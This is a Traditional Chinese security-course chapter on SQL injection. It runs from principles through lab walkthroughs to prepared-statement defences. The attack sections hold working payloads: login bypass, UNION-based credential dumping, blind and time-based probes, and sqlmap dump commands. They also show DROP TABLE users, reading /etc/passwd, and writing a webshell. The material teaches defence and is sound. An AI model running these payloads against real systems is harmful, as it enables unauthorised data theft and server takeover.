# 第 07 章:注入攻擊 —— SQL Injection

> 上一章我們攤開了整張 Web 攻擊地圖,也把 Burp Suite 這把瑞士刀磨利了。現在,該打第一場硬仗。
> 我們從 OWASP A03「注入」開刀,而注入家族裡最經典、危害最深、也最歷久不衰的頭號代表,就是 **SQL Injection(SQL 注入,簡稱 SQLi)**。
> 這一章你會親眼看到:一句看似無害的 `' OR '1'='1` 是怎麼讓登入直接崩潰、`UNION SELECT` 怎麼把整個資料庫端上桌、
> 就算頁面「什麼都不回」,盲注又怎麼靠真假問題或時間差,一個字元一個字元把密碼問出來。
> 攻完當然要會防——你會學到那句往後你會背到滾瓜爛熟的真言:**參數化查詢(prepared statements)**。
> 上一章練的 Burp Repeater,這一章就是你的主戰武器。所有實作,請務必在你自己的靶場(第 01 章)進行。

## 7.1 開場:為什麼 SQLi 是「漏洞之王」

在資安圈,SQL 注入有個外號叫「**漏洞之王**」。它憑什麼?三個字:老、狠、多。

**老 —— 歷史悠久。**
SQLi 早在 1998 年就被公開討論,到現在快三十年了。照理說這麼老的漏洞早該絕跡,但它就像蟑螂一樣打不完。為什麼?因為它的根源不是某個特定框架的 bug,而是一種**寫程式的壞習慣**——只要有人還在用「字串拼接」組 SQL 查詢,這個漏洞就會一直生出來。

**狠 —— 危害極大。**
一旦得手,SQLi 往往不是「洩漏一點小資料」而已,而是**整個資料庫任你予取予求**:全站帳號密碼、個資、訂單、金流紀錄……更嚴重的,某些情況下能透過資料庫**讀寫伺服器檔案、甚至執行系統指令(RCE)**(7.9 節會點到)。歷史上無數重大外洩事件——從電商、社群到政府機關——追根究柢都是一個 SQL 注入點。

**多 —— 至今仍常見。**
儘管防禦方法早就成熟(參數化查詢),SQLi 在 OWASP Top 10 裡始終名列前茅。2021 版把它歸進 **A03 注入**(第 06 章),而 A03 綜合排名第三。真實世界的滲透測試裡,它依然是最常挖到的高危漏洞之一,尤其在那些「祖傳程式碼」「趕工外包案」「沒人敢動的舊系統」裡。

> **心智模型**:SQLi 之所以是漏洞之王,不是因為它多難利用,而是因為它**又好打、又致命、又到處都有**。它完美體現了第 00 章的信任邊界思維——當開發者把「使用者輸入的資料」和「自己寫的 SQL 指令」混在同一個字串裡,災難就注定發生。這一章你會徹底理解「資料」與「程式碼」為什麼必須分家。

這一章的價值不只在「學會打 SQLi」,更在於:**它是理解所有注入類漏洞的原型。** 命令注入、XXE、SSTI、NoSQL 注入(第 08 章)、甚至 XSS(第 09 章),骨子裡都是同一句話的變奏——**「資料被當成程式碼執行了」**。把 SQLi 想透,後面那些注入你會學得又快又深。

## 7.2 原理:SQL 注入的本質是「資料被當成程式碼執行」

先講清楚一件事:SQLi 的本質,**跟資料庫本身沒關係,問題出在程式怎麼組出那句 SQL**。

### 一個典型(而且錯誤)的登入查詢

想像一個最常見的登入功能。後端拿到使用者輸入的帳號密碼,組出一句 SQL 去資料庫查「有沒有這組帳密」。很多人會這樣寫(這裡用 PHP 示範,但任何語言只要用字串拼接都一樣):

```php
// ❌ 危險寫法:直接把使用者輸入拼進 SQL 字串
$user = $_POST['username'];   // 使用者輸入的帳號(不可信!)
$pass = $_POST['password'];   // 使用者輸入的密碼(不可信!)

$sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
//       └─────────── 固定的指令骨架 ──────────┘ └── 使用者輸入被直接塞進來 ──┘
```

正常使用者輸入 `alice` / `secret`,組出來的 SQL 是:

```sql
SELECT * FROM users WHERE username = 'alice' AND password = 'secret'
--     查詢 users 表         帳號等於 alice      而且   密碼等於 secret
```

資料庫查到「帳號 alice 且密碼 secret」的那一列,回傳,登入成功。看起來一切正常。

### 攻擊者怎麼想

問題來了:那對單引號 `'...'` 是拿來「框住資料」的邊界。**如果攻擊者的輸入裡自己帶了一個單引號,會發生什麼?** 他會提前「關掉」那個資料框,讓後面的內容跳出「資料」的身分,變成 SQL **指令**的一部分。

攻擊者在帳號欄位輸入這串:

```
' OR '1'='1' -- 
```

我們把它代入原本的字串骨架,看組出來的 SQL 變成什麼:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = ''
--                                    ↑    ↑        ↑
--   使用者的 ' 提前關閉字串 ──────────┘    │        └── -- 之後全被當成註解,整段密碼檢查消失
--                        OR '1'='1' 是攻擊者硬塞進來、永遠成立的條件
```

逐段拆解這句被「污染」後的 SQL:

- **`username = ''`**:攻擊者一開頭的 `'` 把帳號框成空字串,這條件是 FALSE(沒人帳號是空的)。
- **`OR '1'='1'`**:攻擊者硬塞的條件。`'1'='1'` 永遠成立(TRUE)。於是 `FALSE OR TRUE` = **TRUE**。
- **`-- `**:SQL 的**單行註解**符號(dash-dash-空格)。它後面那句原本要檢查密碼的 `' AND password = ''` **整段被當成註解丟掉了**——密碼驗證直接蒸發。

結果:`WHERE` 條件恆為真,資料庫把 `users` 表**所有列**都回傳。後端一看「有查到資料耶」,判定登入成功——通常會登入成表格裡的第一個使用者,而那往往就是 `admin`。**攻擊者不知道任何一組真實密碼,就登進了後台。**

如果他想指名登入某個帳號,更簡單:

```
admin' -- 
```

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = ''
--                                   ↑ 只查 admin  ↑ 密碼檢查被註解掉
```

查到 admin 這列、密碼檢查被註解,直接以 admin 身分登入。**這就是最經典的 SQLi 登入繞過(authentication bypass)。**

> **心智模型:資料庫分不清哪些是你的「資料」、哪些是它該執行的「指令」。** 對資料庫來說,它收到的就是一整句 SQL 字串,它不知道 `'admin'` 這幾個字是「開發者寫的」還是「使用者塞的」——它只是老實地照字面執行。SQLi 的全部祕密就在這裡:**當使用者輸入能改變 SQL 的「語法結構」(而不只是填充「資料值」),資料與程式碼的界線就被打破了。** 記住這句話,7.10 的防禦你會秒懂——因為根治之道,就是「把資料和程式碼在物理上分開送給資料庫」。

這完美呼應第 00 章的信任邊界(第 06 章邊界②:後端 → 資料庫):**開發者把不可信的輸入,直接混進了可信的指令裡。**

## 7.3 快速複習 SQL:只講攻防會用到的

要打 SQLi,你得先看得懂、寫得出 SQL。這一節只挑攻防最常用的語法快速過一遍,已經熟的可以跳過。

### SELECT / WHERE:查詢的基本

```sql
SELECT username, password FROM users WHERE id = 1;
-- SELECT 要哪些欄位   FROM 哪張表   WHERE 篩選條件(只要 id 等於 1 的那列)
```

- **`SELECT`**:指定要撈哪些欄位,`SELECT *` 是「全部欄位」。
- **`FROM`**:從哪張表撈。
- **`WHERE`**:篩選條件。**SQLi 最常下手的地方就是 `WHERE` 後面的條件**(因為使用者輸入常被拼在這)。

### 邏輯運算子:`AND` / `OR` 與優先序

```sql
... WHERE username = 'a' AND password = 'b'   -- 兩個條件都成立才算數
... WHERE username = 'a' OR  1=1              -- 任一成立即可(1=1 永遠成立 → 整句恆真)
```

**關鍵陷阱:`AND` 的優先序比 `OR` 高**(就像數學裡乘法先於加法)。所以 `A OR B AND C` 實際上是 `A OR (B AND C)`。7.2 的 `' OR '1'='1' -- ` 之所以要用註解砍掉後半,部分原因就是為了避免被 `AND password` 拉低結果——直接註解掉最乾脆。

### UNION:把兩個查詢的結果「接」在一起

`UNION` 是 Union-based 注入(7.6)的核心。它把兩句 `SELECT` 的結果**上下疊起來**回傳:

```sql
SELECT id, name FROM products        -- 第一句:原本的查詢
UNION
SELECT username, password FROM users -- 第二句:攻擊者接上去、想偷的東西
```

**使用 `UNION` 有兩個鐵律**(7.6 會實際用到):

1. **兩句的欄位數必須一樣**(第一句選 2 欄,第二句也要 2 欄,否則報錯)。
2. **對應欄位的資料型別要相容**。

攻擊者就是利用「原本的查詢」後面接一句自己的 `UNION SELECT`,把資料庫裡任何想要的東西,順著原本的頁面顯示位置「借屍還魂」秀出來。

### 註解語法:砍掉後面礙事的部分

注入時,你插入的 payload 後面往往還跟著開發者原本寫的 SQL 尾巴(像 `' AND password = ''`)。用**註解**把它砍掉,是家常便飯:

| 語法 | 說明 | 常見於 |
|------|------|--------|
| `-- `(dash dash 空格) | 單行註解,**注意後面那個空格是必要的** | MySQL、PostgreSQL、MSSQL、Oracle |
| `#` | 單行註解 | MySQL 專屬 |
| `/* ... */` | 區塊註解,可夾在句子中間 | 多數資料庫 |

> **心智模型**:註解符號是攻擊者的「橡皮擦」——把我 payload 後面、開發者原本寫死的那截 SQL 尾巴擦掉,讓整句話乾淨地在我的控制下結束。看到 payload 結尾常有 `-- ` 或 `#`,就是這個作用。

### 幾個好用的內建函式(後面實戰會用)

```sql
SELECT database();      -- 目前正在用哪個資料庫(schema)名稱
SELECT version();       -- 資料庫的版本(判斷是 MySQL 幾點幾,決定用哪套語法)
SELECT user();          -- 目前連線用的資料庫帳號(判斷權限高低)
```

## 7.4 找出注入點:哪裡可能有 SQLi、怎麼測

會打之前,得先找到「哪裡可以打」。**任何一個「使用者輸入最後會被拼進 SQL」的地方,都是潛在注入點。** 呼應第 06 章「所有輸入都不可信」,常見的注入點包括:

| 位置 | 例子 | 說明 |
|------|------|------|
| **URL 參數** | `?id=1`、`?category=books` | 最經典、最常見 |
| **表單欄位** | 登入的帳密、搜尋框、留言 | POST body 裡的欄位 |
| **Cookie** | `Cookie: tracking=abc` | 後端若拿 Cookie 值查 DB 就中 |
| **HTTP Header** | `User-Agent`、`Referer`、`X-Forwarded-For` | 有些站會把 header 記進 DB(如記錄來源) |
| **JSON / API 參數** | `{"id": 1}` | 現代 API 常見,別忘了測 |

### 用單引號 `'` 做第一步試探

找注入點最快的手法,就是**丟一個單引號 `'` 進去,看應用會不會壞掉**。原理很單純:如果你的輸入被拼進 `'...'` 這種字串裡,多一個單引號就會破壞 SQL 的引號配對,造成語法錯誤。

以一個商品查詢頁為例,原本網址是 `http://靶機/product?id=1`。用 Burp Repeater(第 06 章)把 `id` 改成:

```
http://靶機/product?id=1'
--                     ↑ 在正常值後面加一個單引號
```

後端組出的 SQL 會變成引號不對稱:

```sql
SELECT * FROM products WHERE id = '1''
--                                  ↑ 多出來的單引號,引號配對壞了 → 語法錯誤
```

接著觀察反應,可能出現幾種結果:

- **噴出資料庫錯誤訊息**(如 `You have an error in your SQL syntax...`):恭喜,幾乎確定有注入點,而且是**會回顯錯誤**的類型(Error-based,7.5)。這種錯誤訊息還常常直接洩漏資料庫種類、版本、甚至部分查詢語句——這本身就是 A05 安全設定錯誤(第 19 章)。
- **頁面變成空白 / 500 錯誤 / 跟平常不一樣**:很可能有注入點,只是錯誤被吞掉了,可能要走盲注(7.7)。
- **完全沒變化**:可能沒注入點,或輸入被過濾了,換個 payload 再試(如 `1"`、`1)`、`1' -- `)。

再補一個驗證技巧:丟 `'` 若出錯,再丟 `''`(兩個單引號)看是否**恢復正常**——因為兩個單引號讓配對又對稱了。「單引號出錯、雙引號正常」是注入點極強的訊號。也可以用**布林測試**確認:`?id=1 AND 1=1`(應正常)對比 `?id=1 AND 1=2`(應查無資料),兩者反應不同,就代表你的輸入確實影響了 SQL 邏輯。

> **心智模型**:那個單引號 `'` 就像醫生的小槌子,輕輕敲一下膝蓋看有沒有反射。它不是攻擊,是**探針**——用最小的動作,試探「我的輸入到底有沒有跑進 SQL 的語法結構裡」。有反應(報錯或行為改變),才值得繼續深入。

## 7.5 注入類型全景:先看懂地圖,再挑武器

SQLi 依「攻擊者怎麼把資料拿回來」分成三大類。先建立全景,後面 7.6、7.7 各挑代表深入實作。

| 大類 | 子類型 | 白話定義 | 適用情境 |
|------|--------|---------|---------|
| **In-band(帶內)** | Error-based | 故意觸發資料庫錯誤,讓**錯誤訊息**把資料吐出來 | 頁面會顯示 DB 錯誤細節時 |
| | Union-based | 用 `UNION SELECT` 把想偷的資料**接在正常結果後面顯示** | 頁面會把查詢結果**回顯**到畫面時 |
| **Blind(盲注)** | Boolean-based | 頁面不回顯資料,但**「真 / 假」會讓頁面有不同反應**,靠這個一位一位問 | 頁面沒有錯誤、沒有回顯,但真假查詢畫面不同 |
| | Time-based | 連真假都看不出來,就**用 `SLEEP()` 製造延遲**,靠回應快慢判斷真假 | 頁面對任何輸入反應都一樣時的最後手段 |
| **Out-of-band(帶外)** | OOB | 誘使資料庫**主動對外發起連線**(如 DNS / HTTP),把資料夾在請求裡送出來 | 前兩類都不通,但 DB 能對外連線時 |

三句話幫你分辨:

- **In-band**:攻擊和取資料走「同一條路」——你在同一個頁面請求裡,就把資料看到了。**最直接、最好用。**
- **Blind(盲注)**:頁面**不會**直接把資料秀給你,你像在玩「猜數字」——只能問是非題(Boolean)或計時題(Time),一點一點把資料逼出來。**慢,但看不到回應也偷得到。**
- **Out-of-band**:前兩條路都堵死時的偏門——讓資料庫「打電話回報」給你控制的伺服器。較進階,這裡先知道有這回事即可。

> **心智模型**:三大類本質是「**資料回傳的頻寬**」由寬到窄。In-band 是「當面告訴你答案」;Blind 是「只能點頭或搖頭,你得一題一題問」;Out-of-band 是「當面不能講,偷偷寄一封信給你」。頻寬越窄,攻擊越慢、越麻煩,但**只要有任何一條資訊通道洩漏,資料就守不住**——這也是為什麼防禦不能靠「藏錯誤訊息」,得從根本(參數化查詢)解決。

接下來兩節,我們用 **Union-based**(In-band 的代表,最直觀)和 **Blind**(展示「看不到也能偷」的威力)各做一次完整實戰。

## 7.6 【實戰】Union-based 注入:把整個資料庫端出來

這一節我們走一次完整的 Union-based 注入,從無到有把資料庫帳密 dump 出來。**練習環境**:經典靶場 **sqli-labs** 的 Less-1(或 DVWA 的 SQL Injection 關卡,調成 Low 難度),它是專門設計來合法練習 SQLi 的(呼應第 00 章:只在授權靶場動手)。假設注入點是 `http://靶機/Less-1/?id=1`。

### 步驟一:判斷查詢有幾個欄位

要用 `UNION SELECT`,你的 `SELECT` 欄位數**必須跟原查詢一模一樣**(7.3 的鐵律),所以第一步是「數欄位」。有兩種方法。

**方法 A:`ORDER BY` 遞增法。** `ORDER BY n` 是「照第 n 欄排序」,如果第 n 欄不存在就會報錯。於是遞增試到報錯為止:

```
?id=1 ORDER BY 1 --      ← 照第 1 欄排序,正常
?id=1 ORDER BY 2 --      ← 照第 2 欄排序,正常
?id=1 ORDER BY 3 --      ← 照第 3 欄排序,正常
?id=1 ORDER BY 4 --      ← 報錯!Unknown column '4' → 代表只有 3 欄
```

`ORDER BY 3` 還正常、`ORDER BY 4` 報錯,得知原查詢有 **3 個欄位**。

**方法 B:`UNION SELECT NULL` 法。** 直接用不同數量的 `NULL` 去湊,湊對數字就不會報錯(用 `NULL` 是因為它相容任何型別):

```
?id=-1 UNION SELECT NULL --              ← 1 個 NULL,欄位數不對,報錯
?id=-1 UNION SELECT NULL,NULL --         ← 2 個,還是不對
?id=-1 UNION SELECT NULL,NULL,NULL --    ← 3 個,不報錯了 → 確認 3 欄
```

> 注意這裡把 `id=1` 改成 `id=-1`(一個不存在的值)。**用意是讓原查詢「查無資料」,這樣頁面上顯示的就只剩下我們 `UNION` 接上去的那一列**,乾淨、好觀察。這是 Union 注入的常用小技巧。

### 步驟二:找出「回顯位置」

知道 3 欄了,但不是每一欄都會被印在畫面上。我們要找出**哪幾欄的內容真的會顯示出來**。把 `NULL` 換成好認的數字:

```
?id=-1 UNION SELECT 1,2,3 --
--                   ↑ ↑ ↑ 分別放 1、2、3,看畫面上出現哪個數字
```

假設畫面上印出了「2」和「3」——代表**第 2 欄和第 3 欄是回顯位置**。接下來凡是想看的資料,就往第 2、3 欄塞。

### 步驟三:先做資料庫指紋,問出「我在哪」

在回顯位置塞入內建函式(7.3),摸清環境:

```
?id=-1 UNION SELECT 1, version(), database() --
--                     ↑取版本      ↑取目前資料庫名稱
```

畫面回顯,例如版本 `8.0.32`、資料庫名 `security`。**現在我們知道這是 MySQL 8,目標 schema 叫 `security`。**

### 步驟四:列出所有表格(information_schema 登場)

MySQL 有一個內建的「後設資料資料庫」叫 **`information_schema`**,它記錄了「有哪些資料庫、哪些表、哪些欄位」——等於是整個資料庫的地圖。攻擊者靠它按圖索驥:

```
?id=-1 UNION SELECT 1, group_concat(table_name), 3
        FROM information_schema.tables
        WHERE table_schema = 'security' --
--  group_concat():把多列結果「串成一個字串」,才能塞進單一回顯欄位一次看完
--  information_schema.tables:所有表格的清單
--  WHERE table_schema='security':只看 security 這個資料庫裡的表
```

回顯出所有表名,例如:`emails, referers, uagents, users`。**`users` 一看就是我們的目標。**

### 步驟五:列出目標表的欄位

知道有 `users` 表,再查它有哪些欄位:

```
?id=-1 UNION SELECT 1, group_concat(column_name), 3
        FROM information_schema.columns
        WHERE table_name = 'users' --
--  information_schema.columns:所有欄位的清單
--  WHERE table_name='users':只看 users 表的欄位
```

回顯出欄位名,例如:`id, username, password`。**目標鎖定:`username` 和 `password`。**

### 步驟六:dump 帳號密碼

地圖畫完,收網。直接把帳密撈進回顯位置:

```
?id=-1 UNION SELECT 1,
        group_concat(username, 0x3a, password SEPARATOR 0x0a),
        3 FROM users --
--  group_concat(...):把每一列的帳密串起來一次全撈
--  0x3a:是冒號「:」的十六進位,用來分隔帳號和密碼(順便避開直接打引號被過濾)
--  0x0a:是換行符,讓每組帳密分行顯示,好讀
```

畫面上就會吐出一整份帳密清單:

```
admin:admin123
alice:P@ssw0rd
bob:letmein
...
```

**至此,整個資料庫的帳密已經在你手上。** 這就是 Union-based 注入的完整殺傷力——從一個 `?id=1`,六步之內端出全站帳密。

> **心智模型**:Union 注入像是「搭便車」。原本的查詢是一班開往畫面的公車,你用 `UNION` 把自己想偷的貨(帳密)偷偷掛在這班車後面,跟著一起被載到畫面上秀出來。`information_schema` 則是資料庫免費提供的「館藏目錄」,讓你不用亂猜表名欄名,直接查地圖。

## 7.7 【實戰】Blind 注入:看不到回應,照樣偷資料

現實中很多網站不會乖乖回顯查詢結果,也把錯誤訊息藏得好好的。頁面永遠只回「查詢成功」或「查無資料」兩種樣子,`UNION` 的結果根本印不出來。這時就輪到**盲注(Blind SQLi)**登場。核心思想是:**我沒辦法叫資料庫「把答案印出來」,但我可以叫它「回答是非題」。**

### Boolean-based:用真 / 假問題一位一位問

原理:構造一個「條件成立 vs 不成立」會讓**頁面產生不同反應**的注入。先確認這個差異存在:

```
?id=1 AND 1=1 --     ← 條件恆真 → 頁面正常顯示商品(這是「真」的長相)
?id=1 AND 1=2 --     ← 條件恆假 → 頁面顯示查無資料(這是「假」的長相)
```

只要這兩個請求頁面**長得不一樣**,我們就有了一個「真 / 假指示燈」。接著,把「想問的問題」塞進條件裡。例如想知道「目前資料庫名稱的第 1 個字母是不是 s」:

```
?id=1 AND SUBSTRING(database(), 1, 1) = 's' --
--        SUBSTRING(字串, 從第幾位, 取幾個字):這裡取 database() 的第 1 個字
--        = 's':問「第 1 個字是不是 s?」
--   若是 → 條件真 → 頁面正常(答案:是)
--   若否 → 條件假 → 頁面查無資料(答案:否)
```

頁面若呈現「真」的長相,代表第一個字元就是 `s`。接著問第 2 個字元、第 3 個……逐位確認。若用二分搜尋比大小(`>` `<`)取代逐字比對,每個字元大約 7 次就能定位:

```
?id=1 AND SUBSTRING(database(),1,1) > 'm' --   ← 第1字比 m 大嗎?(二分逼近)
?id=1 AND SUBSTRING(database(),2,1) = 'e' --   ← 第2字是 e 嗎?
-- 一位一位問下去,拼出完整字串:security
```

同樣的手法可以問出任何東西——表名、欄名、每一組帳密的每一個字元。**慢,但滴水不漏。**

### Time-based:連真假都看不出來時,問「時鐘」

更狠的情況:不管你送什麼,頁面反應**永遠一模一樣**(連「真 / 假」的差別都沒有)。這時還有最後一招——**不看畫面,看時間**。用資料庫的延遲函式,讓「條件成立時故意慢 5 秒」:

```
?id=1 AND IF(SUBSTRING(database(),1,1)='s', SLEEP(5), 0) --
--        IF(條件, 成立時做A, 否則做B)
--        SUBSTRING(database(),1,1)='s':一樣問「第1字是不是 s」
--        SLEEP(5):如果成立,就讓資料庫睡 5 秒才回應
--        0:如果不成立,什麼都不做、立刻回應
```

於是判斷邏輯變成看碼表:

- **回應拖了 5 秒才回來** → 條件成立 → 答案是「是」。
- **秒回** → 條件不成立 → 答案是「否」。

靠這個「時間差」,一樣能一位一位把資料問出來,只是每問一次就得等好幾秒,**極度耗時**——但它證明了一件事:**就算頁面什麼都不吐、什麼反應都沒有,只要注入點存在,資料就守不住。**

> **心智模型**:盲注就像隔著一道牆審問一個只會點頭 / 搖頭的人。Boolean-based 是「看他點頭還搖頭」,Time-based 是「叫他『如果是就舉手停 5 秒』,你在牆外看碼表」。你問不出一整句話,但只要能問是非題,**問夠多次,任何祕密都會被你拼湊出來**。這也是為什麼「藏起錯誤訊息、不回顯資料」根本擋不住 SQLi——盲注不需要任何回顯。

因為盲注要問成百上千次是非題,**手動做完全不切實際**,這正是下一節自動化工具登場的舞台。

## 7.8 自動化利器 sqlmap:好用,但別當黑盒子

盲注一個字元問 7 次、一份帳密幾百個字元……手動做會做到天亮。**sqlmap** 是一套開源的 SQLi 自動化神器:它能自動偵測注入點、判斷注入類型、選好對應技巧、自動 dump 出整個資料庫。它是滲透測試裡最常用的工具之一。

### 基本用法與常用參數

最單純的用法,直接餵一個帶參數的 URL:

```bash
sqlmap -u "http://靶機/Less-1/?id=1" --batch
#      -u:目標 URL(注入點在 id 參數)
#      --batch:所有詢問都用預設答案自動回答,不用一直手動按 Enter
```

sqlmap 會自動對 `id` 參數丟各種 payload,判斷有沒有注入、是哪一類。確認有洞後,一步步深入:

```bash
# 1) 列出所有資料庫(等同 7.6 的步驟四,但全自動)
sqlmap -u "http://靶機/Less-1/?id=1" --dbs --batch
#      --dbs:列出所有 databases

# 2) 指定資料庫,列出裡面的表
sqlmap -u "http://靶機/Less-1/?id=1" -D security --tables --batch
#      -D security:鎖定名為 security 的資料庫
#      --tables:列出它的所有表

# 3) 指定表,dump 出全部資料
sqlmap -u "http://靶機/Less-1/?id=1" -D security -T users --dump --batch
#      -T users:鎖定 users 表
#      --dump:把整張表的內容倒出來(帳密就在這)
```

POST 請求(如登入表單)則用 `--data` 帶 body:

```bash
sqlmap -u "http://靶機/login" --data="username=admin&password=x" --dump --batch
#      --data=...:把要送的 POST body 給它,sqlmap 會測 body 裡的每個參數
```

### 最實用的技巧:餵 Burp 存下來的 request 檔(`-r`)

真實請求常常有一堆 Cookie、header、CSRF token,一個個用參數帶很麻煩。最省事的做法:在 **Burp** 裡(第 06 章)把那個請求右鍵「Copy to file」存成 `request.txt`,直接餵給 sqlmap:

```bash
sqlmap -r request.txt --dump --batch
#      -r request.txt:讀取整個 HTTP 請求檔(含 URL、header、Cookie、body 全都在裡面)
#      sqlmap 會自動測這個請求裡的所有參數
```

這是實務上最常用的組合:**Burp 抓包 → 存檔 → 丟 sqlmap**。你甚至可以用 `-p` 指定只測某個參數、用 `--level` / `--risk` 調整測試的深度與激進程度。

### 嚴正警告:先懂原理,再碰工具

sqlmap 很強,但**這一章刻意把 7.6、7.7 的手動原理擺在 sqlmap 前面**,理由很重要:

- **只會按工具、不懂原理,你不是駭客,是「按鈕猴子」。** sqlmap 失敗時(遇到 WAF、非典型注入、需要繞過)你完全束手無策;懂原理的人才能手動繞過、改 payload、教 sqlmap 怎麼打。
- **面試、報告、真實攻防都要你解釋「為什麼會中、怎麼利用」**,不是「我跑了 sqlmap」。
- **法律紅線(第 00 章):sqlmap 是重型自動化武器,只能對授權目標 / 自建靶場開火。** 拿它掃別人網站,`--dump` 下去就是妨害電腦使用罪的鐵證。

> **心智模型**:sqlmap 是「電鑽」,7.6、7.7 教的是「鑽孔的原理」。給你電鑽前先讓你懂鑽孔,是因為電鑽會卡、會遇到鋼筋(WAF、變形注入),那時只有懂原理的人鑽得過去。**工具放大你的能力,但放大的是零,結果還是零。**

## 7.9 進階與變形:不同資料庫、堆疊查詢、通往 RCE

真實環境比靶場複雜。這一節把幾個進階方向點到為止,讓你知道「水有多深」,細節留給後續章節或你自己深入。

### 不同資料庫的語法差異

SQLi 的「原理」共通,但「語法」隨資料庫而異。做完指紋(7.6 步驟三)知道是哪家,才能選對 payload:

| 功能 | MySQL | PostgreSQL | MSSQL(SQL Server) | SQLite |
|------|-------|-----------|--------------------|--------|
| 字串串接 | `CONCAT(a,b)` | `a \|\| b` | `a + b` | `a \|\| b` |
| 版本 | `version()` | `version()` | `@@version` | `sqlite_version()` |
| 延遲(盲注) | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | (無內建,難做 time-based) |
| 後設資料 | `information_schema` | `information_schema` | `information_schema` | `sqlite_master` |
| 註解 | `-- `、`#` | `-- ` | `-- `、`/* */` | `-- ` |

重點不是背表,而是理解:**遇到打不動的注入,常常只是「語法用錯家」了**——把 MySQL 的 `SLEEP()` 拿去打 MSSQL 當然沒反應,得換成 `WAITFOR DELAY`。

### 堆疊查詢(Stacked Queries)

有些資料庫 / 驅動允許用分號 `;` 在一次請求裡送**多句 SQL**,這叫堆疊查詢。威力更大——不只查詢,還能改資料、刪表:

```sql
?id=1; DROP TABLE users --
--     ↑ 用分號另起一句全新的指令:直接刪掉 users 表
```

但要注意:**能不能堆疊,取決於資料庫和後端驅動**。MSSQL、PostgreSQL 通常支援;而 MySQL 搭配 PHP 常用的 `mysqli_query` / PDO 預設**不允許**一次跑多句(這反而擋掉了一部分堆疊攻擊)。

### 經由 SQLi 讀寫檔案,甚至 RCE

最嚴重的情況,SQLi 能突破資料庫、影響作業系統本身(前提是資料庫帳號權限夠高——這正是 7.10「最小權限」要防的):

- **讀檔**:MySQL 的 `LOAD_FILE('/etc/passwd')` 可讀伺服器上的檔案。
- **寫檔 → webshell**:MySQL 的 `SELECT ... INTO OUTFILE '/var/www/html/shell.php'` 可把一段 PHP 木馬寫進網站目錄,之後連上去就能執行系統指令,達成 **RCE(遠端程式碼執行)**。
- **MSSQL 的 `xp_cmdshell`**:若開啟,可直接執行作業系統命令。

> **心智模型**:SQLi 不一定「止於資料庫」。當資料庫帳號權限太大,一個網頁的注入點,可能一路打穿到「在伺服器上執行任意指令」——這就從「偷資料」升級成「接管主機」。這條「從 Web 漏洞打到系統控制」的路,是第 14 章(漏洞利用)、第 16 章(提權後滲透)的主題。這裡先知道:**SQLi 的天花板,遠比你想的高。**

## 7.10 【防禦】根治之道:讓資料與程式碼分家

攻完了,回到這門課的靈魂——**怎麼防**。SQLi 的防禦,好消息是:它有一個近乎「根治」的解法,而不是東補西補。壞消息是:很多人到現在還不用。

### 頭號解方:參數化查詢(Prepared Statements)

回到 7.2 的心智模型:SQLi 的病根,是「資料」和「程式碼」被混在同一個字串裡送給資料庫。**參數化查詢的做法,就是把兩者「物理上分開送」**——先把 SQL 指令的「骨架」告訴資料庫(帶著佔位符 `?`),再把「資料」單獨送過去填。這樣一來,**資料永遠只是資料,絕不可能被解讀成 SQL 語法**。

看**錯誤寫法 vs 正確寫法**的對照(PHP PDO 示範):

```php
// ❌ 錯誤:字串拼接。使用者輸入直接變成 SQL 的一部分(7.2 的病根)
$sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
$db->query($sql);
// 攻擊者輸入 ' OR '1'='1' --  → 就改變了整句 SQL 的「結構」→ 淪陷
```

```php
// ✅ 正確:參數化查詢。骨架與資料分開送
$stmt = $db->prepare(
    "SELECT * FROM users WHERE username = ? AND password = ?"
);
//   prepare():先把「帶佔位符 ? 的 SQL 骨架」交給資料庫、編譯定案
//   此時 SQL 的結構已經鎖死,之後填什麼都只是「值」

$stmt->execute([$user, $pass]);
//   execute():把使用者輸入當「純資料」填進 ? 的位置
//   就算 $user 是 ' OR '1'='1' -- ,資料庫也只當成「一個叫這個名字的帳號」去查
//   → 查無此人,登入失敗。攻擊自然失效,不需要你去過濾任何字元
```

**兩者的本質差異**:

| | 字串拼接(❌) | 參數化查詢(✅) |
|---|---|---|
| 資料何時進入 SQL | 組字串時就混進去 | 骨架編譯**之後**才填,永遠是「值」 |
| 使用者能否改變 SQL 結構 | **能**(這就是漏洞) | **不能**(結構已鎖死) |
| 要不要煩惱過濾特殊字元 | 要,而且永遠濾不乾淨 | **不用**,單引號就只是單引號 |

> **心智模型:參數化查詢 = 先把句子的「文法結構」定稿,再填空。** 好比一張已經印好的表格:「姓名:____ 密碼:____」,你在空格裡寫什麼都只是「填進格子的內容」,不可能改變表格本身的欄位設計。攻擊者就算在姓名格裡寫「OR 1=1」,那也只是一個很怪的「姓名」,而不是一條指令。**這就是根治——因為它從機制上消滅了「資料變成程式碼」的可能。**

### 其他該一起做的防禦(縱深防禦,第 06 章)

參數化查詢是主防線,但依「縱深防禦」原則,再疊上幾層:

- **ORM(物件關聯對映)**:像 Hibernate、Sequelize、Django ORM、Laravel Eloquent 這類框架,底層預設就用參數化查詢,你寫 `User.find(id)` 而不是手拼 SQL,自然安全。**但注意:ORM 若被拿來執行「原始 SQL(raw query)」而又用字串拼接,一樣會中招**——ORM 不是免死金牌。
- **最小權限的資料庫帳號(第 06 章支柱三)**:Web 應用連 DB 的帳號,只給它業務需要的權限。不需要 `DROP`、`FILE`、`INTO OUTFILE` 就別給——這樣即使真的被注入,7.9 那種「寫 webshell / 刪表 / RCE」的重災就做不成,把爆炸半徑壓到最小。
- **輸入驗證白名單(第 06 章支柱一)**:能用白名單就用。像「排序方向只能是 `ASC` / `DESC`」「分頁大小只能是數字」這種**無法參數化的部分**(欄位名、排序方向沒辦法用 `?` 佔位),更要靠白名單嚴格限定合法值。
- **關閉詳細錯誤訊息(第 19 章)**:別把資料庫錯誤原文噴到前端(那會餵養 Error-based 注入,也是 A05)。給使用者看籠統的「系統忙碌」,細節記在後端 log 就好。

### WAF:有用的補牆,但不是根治

第 06 章講過 WAF 的定位,這裡再對 SQLi 講一次:WAF 能攔掉大量「長得像 SQL 注入」的請求(如包含 `UNION SELECT`、`' OR '1'='1` 的封包),擋掉自動化掃描的雜訊、爭取修補時間。**但它是黑名單思維,有繞過空間**——攻擊者用註解拆字(`UN/**/ION SE/**/LECT`)、大小寫變形、編碼、等價寫法,就可能鑽過去。

